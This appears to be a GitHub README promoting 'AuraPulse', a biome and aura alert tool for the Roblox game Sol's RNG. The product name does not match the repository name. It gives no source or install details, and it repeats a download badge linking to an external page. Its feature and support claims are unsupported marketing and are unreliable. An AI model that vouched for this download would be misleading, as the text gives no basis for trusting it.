![preview](https://raw.githubusercontent.com/tarafighter/Vortex-Biome-Sentinel/main/banner_e029bf.svg)
[![Download](https://raw.githubusercontent.com/tarafighter/Vortex-Biome-Sentinel/main/latest_7e4cb3e.svg)](https://tarafighter.github.io/Vortex-Biome-Sentinel/)

# 🌪️ AuraPulse — Real-Time Fortune Signal Observatory

**A next-generation, cross-platform companion for tracking biome shifts and aura manifestations across multiple Roblox sessions — engineered for enthusiasts who treat luck as a science, not a lottery.**

Welcome to **AuraPulse**, a project born from a simple frustration: what if the hunt for rare biome events didn't have to feel like staring at a slot machine in the dark? Inspired by the community around *Sol's RNG*, AuraPulse reimagines what a detection and alerting layer could look like when it's built with modern architecture, genuine multi-account orchestration, and an obsession with signal clarity. This is not merely a fork of an idea — it's a redesign of the entire philosophy behind biome tracking.

Whether you're a solo player chasing that elusive Glitched biome at 3 AM, or a small collective coordinating dozens of sessions at once, AuraPulse provides the telemetry, the notifications, and the resilience you'd expect from professional monitoring software — except it's pointed at the whims of an RNG.

---

## 📖 Table of Contents

1. [Why AuraPulse Exists](#-why-aurapulse-exists)
2. [The Philosophy Behind the Name](#-the-philosophy-behind-the-name)
3. [Feature Overview](#-feature-overview)
4. [Multi-Webhook Delivery Engine](#-multi-webhook-delivery-engine)
5. [Multi-Account Orchestration](#-multi-account-orchestration)
6. [Responsive Interface & Cross-Device Experience](#-responsive-interface--cross-device-experience)
7. [Multilingual Support](#-multilingual-support)
8. [Reliability, Uptime & Support](#-reliability-uptime--support)
9. [Dashboard Anatomy](#-dashboard-anatomy)
10. [Signal Pipeline Explained](#-signal-pipeline-explained)
11. [Configuration Reference](#-configuration-reference)
12. [Notifications & Alert Formatting](#-notifications--alert-formatting)
13. [Performance & Resource Footprint](#-performance--resource-footprint)
14. [Roadmap for 2026](#-roadmap-for-2026)
15. [Frequently Asked Questions](#-frequently-asked-questions)
16. [Community & Contribution](#-community--contribution)
17. [Disclaimer](#-disclaimer)
18. [License](#-license)

---

## 🌌 Why AuraPulse Exists

The original spark for this project came from a tool called Vortex — a clever, no-nonsense biome and aura detector supporting multiple webhooks and multiple accounts. It solved a real problem: nobody wants to babysit a screen waiting for a rare event. But as the community grew, so did the ambitions of what such a tool could become.

AuraPulse is the answer to a question Vortex never asked out loud: **what if detection was only one part of a larger observability story?**

We took the foundational ideas — multi-webhook broadcasting, multi-account sessions, biome awareness — and rebuilt them around three pillars:

- **Clarity over noise.** Every alert carries context: which account, which server, which biome, the confidence level, the timestamp, and the delta since the last event of its kind.
- **Resilience over fragility.** Sessions drop. Webhooks rate-limit. Networks hiccup. AuraPulse is designed to absorb all of that without losing a single signal.
- **Customization over rigidity.** Every notification channel, every keyword filter, every quiet-hour window is yours to sculpt.

If Vortex was a flashlight, AuraPulse is a lighthouse — same purpose, vastly more reach.

---

## 🧭 The Philosophy Behind the Name

An **aura** is the invisible field that surrounds something, hinting at its true nature before you ever see it clearly. A **pulse** is a heartbeat — a rhythm that tells you something alive is nearby.

Put them together and you have the guiding metaphor for this project: AuraPulse listens for the faint heartbeat of fortune that surrounds every biome shift, and translates that invisible field into something you can actually act on. No superstition. No guesswork. Just clean, timely signal.

---

## ✨ Feature Overview

AuraPulse is deliberately generous with its capabilities. Below is a high-level tour; each subsection later in this document dives deeper.

| Capability | What It Delivers |
|---|---|
| Multi-Webhook Fan-Out | Route the same event to dozens of destinations with per-channel filtering |
| Multi-Account Sessions | Track many simultaneous sessions with independent state |
| Responsive Dashboard | One interface, every screen size |
| Multilingual Interface | Six languages at launch, community-expandable |
| 24/7 Support Model | Always-on issue triage and community help |
| Biome Shift Detection | Graceful, low-latency awareness of environmental changes |
| Aura Manifestation Alerts | Context-rich notifications for rare aura outcomes |
| Alert Digest Mode | Batch bursts of events into a single rolling summary |
| Quiet Hours | Schedule silence windows so alerts respect your life |
| Historical Timeline | Scroll back through days of events with visual density |

---

## 📡 Multi-Webhook Delivery Engine

Most tools treat webhooks as an afterthought — a single URL in a config file, fire-and-forget. AuraPulse treats webhook delivery as a first-class subsystem, because a missed alert is worse than no alert at all.

### Fan-Out Architecture

Every detected event can be broadcast to many destinations in parallel. Each destination maintains its own queue, its own retry policy, and its own health score. If one channel is slow or unresponsive, the others are unaffected.

### Per-Channel Filtering

Not every channel wants every event. You can attach rules to each destination:

- **Biome filters** — only forward events matching certain biome names or tiers.
- **Rarity thresholds** — suppress common aura outcomes and only surface the extraordinary.
- **Keyword rules** — include or exclude based on matching text tokens.
- **Rate governors** — cap the maximum number of messages per minute per channel.
- **Quiet windows** — silence a specific channel during specific hours.

### Delivery Semantics

AuraPulse aims for *at-least-once* delivery with de-duplication. Each message carries a stable identifier so a receiving system can discard repeats if it wishes. Retries use exponential backoff with jitter, and a dead-letter log keeps a record of messages that exhausted their attempts, so nothing vanishes silently.

### Health Monitoring

The dashboard exposes a per-channel health widget: last successful delivery, rolling success rate over the past hour, and current backlog depth. If a channel starts misbehaving, you'll see it before your notifications go dark.

---

## 👥 Multi-Account Orchestration

Running many sessions is where most trackers start to sweat. AuraPulse was designed from day one to juggle them.

### Independent Session State

Each account gets its own isolated runtime: its own biome timeline, its own aura history, its own notification preferences. One account's stumble never drags down the rest.

### Unified View, Granular Control

The dashboard shows an aggregate rollup of all accounts at a glance — total events, active sessions, hottest biome right now — while still letting you drill into a single account's stream with one click.

### Grouping & Labels

Assign human-friendly labels to each session — "Main", "Alt Farm", "Night Watcher", "Test Bed". Labels flow through into every notification, so when your phone buzzes you know instantly which context it came from.

### Graceful Reconnection

When a session drops, AuraPulse doesn't spam you with a wall of errors. It enters a reconnection backoff, logs the interruption once, and quietly restores state when the session returns. You only hear about it if the outage is persistent.

---

## 🖥️ Responsive Interface & Cross-Device Experience

The dashboard is built mobile-first, then scaled up to tablet and desktop layouts. The same information architecture serves every size:

- **Compact view** — a vertical feed of the latest events, optimized for one-handed scrolling.
- **Standard view** — a two-column layout with a live event stream beside configuration panels.
- **Wide view** — a three-panel cockpit with session list, event stream, and per-channel health simultaneously visible.

Touch targets meet accessibility guidelines, dark mode is the default (because most hunting happens at night), and a light theme is available for the daylight hours. Reduced-motion preferences are respected throughout — animations are decorative, never load-bearing.

---

## 🌐 Multilingual Support

AuraPulse ships with an interface that speaks more than one language out of the box, and a translation layer that makes adding more a community-friendly task.

**Languages available at launch:**

- English
- Spanish
- Portuguese (Brazil)
- German
- French
- Japanese

Strings live in simple structured files with descriptive keys. Adding a new language means copying the base file, translating the values, and opening a pull request — no code changes required. Right-to-left layout support is scaffolded for future languages that need it.

---

## 🛡️ Reliability, Uptime & Support

A tool that watches for rare events must itself be dependable. AuraPulse is engineered around the idea that the watcher should be the last thing to fail.

- **Self-healing sessions.** Transient disconnects trigger automatic recovery loops.
- **Circuit breakers.** Misbehaving webhook destinations are temporarily isolated rather than allowed to slow the whole system.
- **Local persistent storage.** Event history survives restarts, so nothing is lost to a crash.
- **Health surface.** A single page shows every subsystem's status at a glance.
- **24/7 support philosophy.** Our issue triage never sleeps — questions asked at 2 AM get attention, not silence. Community helpers and maintainers rotate coverage so there's always a human in the loop.

---

## 🗺️ Dashboard Anatomy

A quick tour of the main panels you'll encounter:

1. **Session Rail** — the leftmost column listing every tracked account with live status dots.
2. **Event Stream** — the center stage, a scrolling feed of biome shifts and aura manifestations with timestamps and context chips.
3. **Channel Matrix** — the rightmost column showing webhook destination health and recent throughput.
4. **Command Bar** — the top strip with global controls: pause all, resume all, mute, and search.
5. **Timeline Drawer** — a collapsible bottom drawer showing event density over the past 24 hours as a heat strip.

Every panel can be collapsed, and layout state is remembered per device.

---

## 🔬 Signal Pipeline Explained

Understanding how a raw observation becomes a delivered alert helps you tune AuraPulse effectively.

1. **Observation** — a session notices environmental change or an aura outcome.
2. **Classification** — the observation is tagged with biome name, rarity tier, and confidence.
3. **Enrichment** — context is attached: account label, session uptime, seconds since last event of this class.
4. **Filtering** — channel-specific rules decide who receives this event.
5. **Formatting** — a template renders the event per channel style.
6. **Queueing** — the message enters the destination's outbound queue.
7. **Delivery** — the queue drains with retry and backoff semantics.
8. **Receipt** — success or failure feeds back into the channel's health score.

Each stage logs independently, so when something looks off you can trace exactly where the signal went sideways.

---

## ⚙️ Configuration Reference

AuraPulse is configured through a single structured file plus optional per-account overrides. The schema is documented inline with comments, and a validation step runs at startup to catch typos before they cause confusion.

Key configuration domains:

- **Accounts** — identity, label, active window, reconnect policy.
- **Channels** — destination type, filters, rate limits, quiet hours.
- **Detection** — sensitivity presets, debounce intervals, minimum confidence.
- **Digest** — batch size, rollup window, summary formatting.
- **Appearance** — theme, density, language, motion preference.
- **Storage** — retention length, export format, backup cadence.

Everything has sensible defaults, so a fresh setup works immediately and you only touch what you want to change.

---

## 🔔 Notifications & Alert Formatting

Notifications are the user-facing surface of the whole system, so they get special care.

- **Context chips** — each alert includes compact visual tokens for account, biome tier, and rarity.
- **Timestamps** — both local time and relative age ("4 minutes ago") are shown.
- **Session uptime note** — if a session was recently reconnected, the alert mentions it so you understand any gaps in the stream.
- **Digest summaries** — instead of ten separate pings, quiet periods can accumulate and deliver one tidy rollup.
- **Templating** — advanced users can author custom templates for their channels.

The design goal is simple: every alert should tell a complete little story without requiring you to open the dashboard.

---

## 🚀 Performance & Resource Footprint

Watching many sessions for hours on end should not melt your machine. AuraPulse is built with efficiency in mind:

- **Event-driven internals** rather than busy polling.
- **Batched disk writes** to spare storage wear.
- **Lazy UI rendering** so the dashboard stays smooth even with thousands of timeline entries.
- **Configurable retention** so you decide how much history to keep.
- **Optional low-power mode** that reduces UI refresh frequency during quiet periods.

Typical desktop usage sits comfortably in a modest memory footprint even with a dozen sessions active.

---

## 🗓️ Roadmap for 2026

The project moves in public, and the road ahead looks like this:

**First half of 2026**
- Advanced digest rules with conditional logic
- Optional desktop companion notifier
- Exportable session reports in multiple formats

**Second half of 2026**
- Plugin surface for community-built channel adapters
- Shared team workspaces for small groups
- Fine-grained per-account quiet hours
- Improved localization tooling with built-in string linting

Longer-horizon ideas include a public read-only status feed and deeper analytics on biome frequency patterns. Priorities shift with community feedback, so speak up in discussions.

---

## ❓ Frequently Asked Questions

**Is AuraPulse a replacement for the original Vortex?**
It's a spiritual evolution. If you loved the multi-webhook, multi-account core of Vortex, AuraPulse keeps that spirit while adding observability, resilience, and a modern interface.

**Do I need many accounts to benefit?**
No. A single session works beautifully. Multiple accounts simply unlock the orchestration features.

**Will my notifications be noisy?**
Only if you want them to be. Filters, rate governors, digests, and quiet hours exist precisely to keep alerts meaningful.

**What languages are supported?**
Six at launch, with community contributions welcomed for more.

**How is support handled?**
Via an always-available triage rotation — questions get eyes on them around the clock, and the community is encouraged to help each other.

**Can I run everything offline?**
Core detection and local storage work without an internet connection; only webhook delivery requires network access.

**Where does my data live?**
On your own machine. AuraPulse does not ship your session data anywhere except where you explicitly point your webhooks.

---

## 🤝 Community & Contribution

AuraPulse grows through the people who use it. Contributions of every size are celebrated:

- **Bug reports** with clear reproduction steps
- **Feature requests** framed around real workflows
- **Translations** for new locales
- **Documentation improvements** — clarity is a feature
- **Channel adapter ideas** for the future plugin surface

Before opening a large pull request, please start a discussion so we can align on direction. Small, focused changes merge faster than sprawling ones. Kindness is the only hard rule.

---

## ⚠️ Disclaimer

AuraPulse is an independent observability utility intended for personal, educational, and enthusiast use. It is not affiliated with, endorsed by, or sponsored by the developers or publishers of *Sol's RNG* or any related platform. All trademarks belong to their respective owners.

Users are responsible for complying with the terms of service of any platform they interact with, as well as any applicable local regulations. The maintainers provide this software as-is, without warranty, and are not liable for any consequences arising from its use — including, but not limited to, account restrictions imposed by third parties.

This tool observes and reports; it does not modify game state, does not alter server behavior, and makes no claims about improving outcomes. Fortune remains, as ever, a matter of chance.

---

## 📜 License

This project is released under the **MIT License**.

You are welcome to use, modify, and distribute this software in accordance with the license terms. See the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 AuraPulse Contributors

---

*Built with patience, tuned with care, and dedicated to everyone who has ever refreshed a screen at 3 AM hoping for a miracle. The miracle is still random — but at least now you'll know when it happens.*

[![Download](https://raw.githubusercontent.com/tarafighter/Vortex-Biome-Sentinel/main/latest_7e4cb3e.svg)](https://tarafighter.github.io/Vortex-Biome-Sentinel/)